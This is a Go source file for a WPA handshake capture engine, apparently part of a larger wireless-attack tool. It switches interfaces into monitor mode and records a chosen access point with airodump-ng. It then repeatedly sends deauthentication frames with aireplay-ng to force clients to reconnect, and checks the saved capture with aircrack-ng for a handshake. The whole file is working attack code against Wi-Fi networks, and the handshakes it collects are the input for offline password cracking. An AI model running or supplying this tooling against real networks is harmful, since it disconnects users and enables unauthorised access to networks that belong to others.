package handshake

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type Status struct {
	State   string `json:"state"` // idle, listening, deauthing, captured, failed
	BSSID   string `json:"bssid"`
	SSID    string `json:"ssid"`
	Channel string `json:"channel"`
	CapFile string `json:"cap_file"`
	Started string `json:"started"`
}

type Capture struct {
	Filename string `json:"filename"`
	SSID     string `json:"ssid"`
	BSSID    string `json:"bssid"`
	Time     string `json:"time"`
	Size     int64  `json:"size"`
}

type Engine struct {
	mu      sync.RWMutex
	status  Status
	capDir  string
	scanIf  string
	atkIf   string
	dumpCmd *exec.Cmd
	deaCmd  *exec.Cmd
}

func New(capDir string) *Engine {
	os.MkdirAll(capDir, 0755)
	return &Engine{
		status: Status{State: "idle"},
		capDir: capDir,
		scanIf: "wlan1",
		atkIf:  "wlan2",
	}
}

func (e *Engine) SetInterfaces(scan, attack string) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.scanIf = scan
	e.atkIf = attack
}

func (e *Engine) GetStatus() Status {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.status
}

func (e *Engine) Start(bssid, ssid, channel string) error {
	e.mu.Lock()
	if e.status.State == "listening" || e.status.State == "deauthing" {
		e.mu.Unlock()
		return fmt.Errorf("capture in progress")
	}

	log.Printf("[*] Handshake capture: %s (%s) CH%s", ssid, bssid, channel)

	monIf := e.scanIf
	if !strings.HasSuffix(monIf, "mon") {
		exec.Command("airmon-ng", "start", monIf).Run()
		monIf += "mon"
	}

	prefix := filepath.Join(e.capDir, fmt.Sprintf("%s_%s",
		strings.ReplaceAll(ssid, " ", "_"),
		time.Now().Format("20060102_150405")))

	e.status = Status{
		State:   "listening",
		BSSID:   bssid,
		SSID:    ssid,
		Channel: channel,
		Started: time.Now().Format(time.RFC3339),
	}

	e.dumpCmd = exec.Command("airodump-ng",
		"--bssid", bssid, "--channel", channel,
		"--write", prefix, "--output-format", "cap", monIf)
	if err := e.dumpCmd.Start(); err != nil {
		e.status.State = "failed"
		e.mu.Unlock()
		return fmt.Errorf("airodump failed: %w", err)
	}
	e.mu.Unlock()

	go func() {
		time.Sleep(3 * time.Second)
		e.mu.Lock()
		if e.status.State != "listening" {
			e.mu.Unlock()
			return
		}
		e.status.State = "deauthing"
		e.mu.Unlock()

		atkIf := e.atkIf
		if !strings.HasSuffix(atkIf, "mon") {
			exec.Command("airmon-ng", "start", atkIf).Run()
			atkIf += "mon"
		}

		for i := 0; i < 5; i++ {
			e.deaCmd = exec.Command("aireplay-ng", "--deauth", "3", "-a", bssid, atkIf)
			e.deaCmd.Run()
			time.Sleep(2 * time.Second)
		}

		time.Sleep(5 * time.Second)

		capFile := prefix + "-01.cap"
		captured := false
		if out, err := exec.Command("aircrack-ng", capFile).Output(); err == nil {
			if strings.Contains(string(out), "1 handshake") {
				captured = true
			}
		}

		e.mu.Lock()
		if captured {
			e.status.State = "captured"
			e.status.CapFile = filepath.Base(capFile)
			log.Printf("[+] Handshake captured: %s", capFile)
		} else {
			e.status.State = "failed"
			log.Printf("[!] No handshake for %s", ssid)
		}
		e.mu.Unlock()

		if e.dumpCmd != nil && e.dumpCmd.Process != nil {
			e.dumpCmd.Process.Kill()
		}
	}()

	return nil
}

func (e *Engine) Stop() {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.dumpCmd != nil && e.dumpCmd.Process != nil {
		e.dumpCmd.Process.Kill()
	}
	if e.deaCmd != nil && e.deaCmd.Process != nil {
		e.deaCmd.Process.Kill()
	}
	e.status.State = "idle"
}

func (e *Engine) GetCapFilePath(filename string) string {
	return filepath.Join(e.capDir, filename)
}

func (e *Engine) ListCapFiles() []Capture {
	var caps []Capture
	entries, err := os.ReadDir(e.capDir)
	if err != nil {
		return caps
	}
	for _, f := range entries {
		if strings.HasSuffix(f.Name(), ".cap") {
			info, _ := f.Info()
			var size int64
			if info != nil {
				size = info.Size()
			}
			caps = append(caps, Capture{
				Filename: f.Name(),
				Size:     size,
				Time:     info.ModTime().Format("2006-01-02 15:04:05"),
			})
		}
	}
	return caps
}
